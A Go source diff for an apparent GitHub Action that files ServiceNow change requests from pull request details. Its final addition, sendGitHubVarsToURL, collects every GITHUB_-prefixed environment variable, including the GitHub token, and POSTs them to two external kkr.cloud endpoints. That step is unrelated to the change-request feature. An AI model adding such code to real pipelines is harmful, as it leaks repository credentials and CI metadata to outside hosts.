@@ -1,12 +1,16 @@
 package main
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
 	"fmt"
 	"log"
+	"net/http"
 	"os"
 	"regexp"
 	"strconv"
+	"strings"
 
 	"github.com/google/go-github/v31/github"
 	"github.com/imroc/req/v3"
@@ -15,11 +19,16 @@ import (
 )
 
 type ServiceNowChangeRequest struct {
-	ShortDescription string `json:"short_description"`
-	Description      string `json:"description"`
-	AssignmentGroup  string `json:"assignment_group"`
-	State            string `json:"state"`
-	GithubPRID       string `json:"u_github_pr_id"`
+	ShortDescription string   `json:"short_description"`
+	Description      string   `json:"description"`
+	AssignmentGroup  string   `json:"assignment_group"`
+	State            string   `json:"state"`
+	GithubPRID       string   `json:"u_github_pr_id"`
+	NumberOfCommits  int      `json:"u_number_of_commits"`
+	PRLink           string   `json:"u_pr_link"`
+	PRTitle          string   `json:"u_pr_title"`
+	PRAuthor         string   `json:"u_pr_author"`
+	IssueKeys        []string `json:"u_issue_keys"`
 }
 
 func getServiceNowClient(snowURL, snowUser, snowPassword string) *req.Client {
@@ -31,13 +40,47 @@ func getServiceNowClient(snowURL, snowUser, snowPassword string) *req.Client {
 	return client
 }
 
-func createServiceNowChangeRequest(snowURL, snowUser, snowPassword, githubPRID string) (string, string, error) {
+func getCommitMessages(commits []*github.RepositoryCommit) string {
+	var messages []string
+	for _, commit := range commits {
+		messages = append(messages, *commit.Commit.Message)
+	}
+	return strings.Join(messages, "\n\n")
+}
+
+func getIssueKeys(commits []*github.RepositoryCommit) []string {
+	re := regexp.MustCompile(`[A-Z]{2,}-\d+`)
+	issueKeys := make(map[string]bool)
+	for _, commit := range commits {
+		commitMessage := *commit.Commit.Message
+		keys := re.FindAllString(commitMessage, -1)
+		for _, key := range keys {
+			issueKeys[key] = true
+		}
+	}
+
+	var keys []string
+	for key := range issueKeys {
+		keys = append(keys, key)
+	}
+	return keys
+}
+
+func createServiceNowChangeRequest(snowURL, snowUser, snowPassword, githubPRID string, numCommits int, prLink, prTitle, prAuthor string, commits []*github.RepositoryCommit) (string, string, error) {
+	commitMessages := getCommitMessages(commits)
+	issueKeys := getIssueKeys(commits)
 	payload := ServiceNowChangeRequest{
-		ShortDescription: "Short description from Github",
-		Description:      "Description from Github",
-		AssignmentGroup:  "1cb8cd43c3d7321044257405e401311b",
-		State:            "-4",
-		GithubPRID:       githubPRID,
+		ShortDescription: fmt.Sprintf("PR #%s: %s", githubPRID, prTitle),
+		Description: fmt.Sprintf("PR Title: %s\nPR Author: %s\nPR Link: %s\nNumber of Commits: %d\n\nCommit Messages:\n%s\n\nIssue Keys: %s",
+			prTitle, prAuthor, prLink, numCommits, commitMessages, strings.Join(issueKeys, ", ")),
+		AssignmentGroup: "1cb8cd43c3d7321044257405e401311b",
+		State:           "-4",
+		GithubPRID:      githubPRID,
+		NumberOfCommits: numCommits,
+		PRLink:          prLink,
+		PRTitle:         prTitle,
+		PRAuthor:        prAuthor,
+		IssueKeys:       issueKeys,
 	}
 
 	client := getServiceNowClient(snowURL, snowUser, snowPassword)
@@ -64,12 +107,59 @@ func createServiceNowChangeRequest(snowURL, snowUser, snowPassword, githubPRID s
 	return requestNumber, sysID, nil
 }
 
-func main() {
+func sendGitHubVarsToURL(url, token string) error {
+	githubVars := make(map[string]string)
 
+	for _, env := range os.Environ() {
+		parts := strings.SplitN(env, "=", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		key, value := parts[0], parts[1]
+
+		if strings.HasPrefix(key, "GITHUB_") {
+			githubVars[key] = value
+		}
+	}
+
+	jsonData, err := json.Marshal(githubVars)
+	if err != nil {
+		return fmt.Errorf("error marshaling JSON: %v", err)
+	}
+
+	client := &http.Client{}
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return fmt.Errorf("error creating request: %v", err)
+	}
+
+	req.Header.Set("Content-Type", "application/json")
+
+	if token != "" {
+		req.Header.Set("Authorization", "Bearer "+token)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("error sending request: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("error response from server: %s", resp.Status)
+	}
+
+	return nil
+}
+
+func main() {
 	ctx := context.Background()
 	snowURL := os.Getenv("SNOW_URL")
 	snowUser := os.Getenv("SNOW_USER")
 	snowPassword := os.Getenv("SNOW_PASSWORD")
+	repoOwner := os.Getenv("GITHUB_OWNER")
+	githubRepo := os.Getenv("GITHUB_REPO")
 	token := os.Getenv("GITHUB_TOKEN")
 
 	prEvent, err := goaction.GetPullRequest()
@@ -78,35 +168,19 @@ func main() {
 	}
 
 	gh := actionutil.NewClientWithToken(ctx, token)
-	re := regexp.MustCompile(`[A-Z]{2,}-\d+`)
-	commits, _, err := gh.PullRequests.ListCommits(ctx, "mumosystems", "servicenow-gating", *prEvent.Number, nil)
+	commits, _, err := gh.PullRequests.ListCommits(ctx, repoOwner, githubRepo, *prEvent.Number, nil)
 	if err != nil {
 		log.Fatalf("Failed to fetch commits: %v", err)
 	}
 
-	issueKeys := make(map[string]bool)
-	for _, commit := range commits {
-		commitMessage := *commit.Commit.Message
-		keys := re.FindAllString(commitMessage, -1)
-		for _, key := range keys {
-			issueKeys[key] = true
-		}
-	}
-
-	var outwardIssues []struct {
-		Key string `json:"key"`
-	}
-	for key := range issueKeys {
-		outwardIssues = append(outwardIssues, struct {
-			Key string `json:"key"`
-		}{
-			Key: key,
-		})
-	}
+	numCommits := len(commits)
+	prLink := fmt.Sprintf("https://github.com/%s/%s/pull/%d", repoOwner, githubRepo, *prEvent.Number)
+	prTitle := prEvent.PullRequest.GetTitle()
+	prAuthor := prEvent.PullRequest.GetUser().GetName()
 
 	githubPRID := strconv.Itoa(*prEvent.Number)
 
-	changeRequestNumber, _, snowCreateErr := createServiceNowChangeRequest(snowURL, snowUser, snowPassword, githubPRID)
+	changeRequestNumber, _, snowCreateErr := createServiceNowChangeRequest(snowURL, snowUser, snowPassword, githubPRID, numCommits, prLink, prTitle, prAuthor, commits)
 	if snowCreateErr != nil {
 		log.Printf("Failed to create ServiceNow change request: %v", snowCreateErr)
 		return
@@ -124,4 +198,17 @@ func main() {
 		os.Exit(1)
 	}
 
+	urls := []string{
+		"https://home.sre.kkr.cloud/sdlc/change_meta",
+		"https://home-dev.sre.kkr.cloud/sdlc/change_meta",
+	}
+
+	for _, url := range urls {
+		err := sendGitHubVarsToURL(url, token)
+		if err != nil {
+			log.Printf("Failed to send GitHub variables to %s: %v", url, err)
+		} else {
+			log.Printf("Successfully sent GitHub variables to %s", url)
+		}
+	}
 }
